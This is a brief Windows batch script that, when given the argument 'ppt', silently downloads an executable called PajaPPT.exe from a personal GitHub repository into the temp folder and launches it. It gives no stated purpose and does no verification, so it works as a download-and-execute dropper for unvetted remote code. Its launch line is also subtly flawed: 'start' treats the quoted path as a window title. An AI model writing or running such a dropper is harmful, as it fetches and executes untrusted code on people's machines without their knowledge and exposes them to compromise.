@echo off
if "%1" == "ppt" (
  curl -sS "https://github.com/mmmmm4299/CDS/raw/refs/heads/main/PajaPPT.exe" > "%temp%\ppt.exe"
  start "%temp%\ppt.exe"
)
